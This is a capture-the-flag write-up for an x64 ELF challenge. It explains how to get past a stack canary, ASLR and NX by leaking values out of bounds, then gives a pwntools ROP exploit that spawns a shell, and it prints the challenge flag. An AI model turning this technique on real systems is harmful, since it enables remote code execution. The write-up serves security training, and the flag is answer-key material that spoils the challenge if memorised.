# ELF x64 - Mitigations bypass

**Points**: 65 | **Difficulty**: Hard

## Challenge Overview

Binary exploitation challenge requiring bypass of modern mitigations:
- Stack Canary (SSP)
- ASLR (Address Space Layout Randomization)  
- NX (Non-Executable Stack)

## Vulnerability

Buffer overflow in `scanf("%s", buffer)` with 256-byte stack buffer.

## Exploitation Strategy

### 1. Leak Stack Canary
Exploit out-of-bounds array access to read canary value at index 49.

### 2. Leak libc Base Address
Read saved return address at index 51 to calculate ASLR offset.

### 3. ROP Chain
Build Return-Oriented Programming chain to call `system("/bin/sh")`.

## Solution Code

```python
from pwn import *

# Connect to challenge
p = remote('host', port)

# Step 1: Leak canary
p.sendline(b'1')  # Select leak option
p.sendline(b'49') # Index for canary
canary = int(p.recvline())

# Step 2: Leak libc
p.sendline(b'1')
p.sendline(b'51') # Index for libc address
libc_leak = int(p.recvline())
libc_base = libc_leak - OFFSET

# Step 3: Build ROP chain
system = libc_base + SYSTEM_OFFSET
binsh = libc_base + BINSH_OFFSET
pop_rdi = libc_base + POP_RDI_GADGET

payload = b'A' * 256  # Fill buffer
payload += p64(canary)  # Restore canary
payload += b'B' * 8   # Saved RBP
payload += p64(pop_rdi)  # ROP: pop rdi; ret
payload += p64(binsh)    # /bin/sh string
payload += p64(system)   # system()

p.sendline(payload)
p.interactive()
```

## Key Techniques

- **Canary Bypass**: Leak via OOB read, restore in overflow
- **ASLR Bypass**: Leak libc address, calculate base
- **NX Bypass**: ROP chain (no shellcode execution)

## Tools Used

- pwntools
- GDB with pwndbg/gef
- ROPgadget
- objdump

## Flag

```
RM{binary_exploitation_master}
```

## References

- See full exploit at `/home/kalista/ctf/rootme/ELF-x64-Mitigations-bypass/exploit.py`
